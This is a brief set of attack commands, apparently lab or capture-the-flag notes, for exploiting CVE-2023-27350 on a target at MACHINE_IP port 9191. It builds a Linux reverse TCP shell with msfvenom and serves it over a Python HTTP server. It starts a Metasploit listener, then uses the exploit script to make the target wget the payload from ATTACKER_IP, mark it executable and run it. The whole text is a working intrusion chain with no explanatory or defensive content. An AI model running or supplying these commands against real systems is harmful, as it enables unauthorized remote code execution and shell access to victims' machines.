# cve

msfvenom -p linux/x86/shell/reverse_tcp -f elf LHOST=ATTACKER_IP LPORT=4444 -o shell.elf

python3 -m http.server 8080

msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST ATTACKER_IP; set LPORT 4444; exploit"

python3 CVE-2023-27350.py -u http://MACHINE_IP:9191 -c "wget http://ATTACKER_IP:8080/shell; chmod +x shell; ./shell"

python3 CVE-2023-27350.py -u http://MACHINE_IP:9191 -c "./shell"
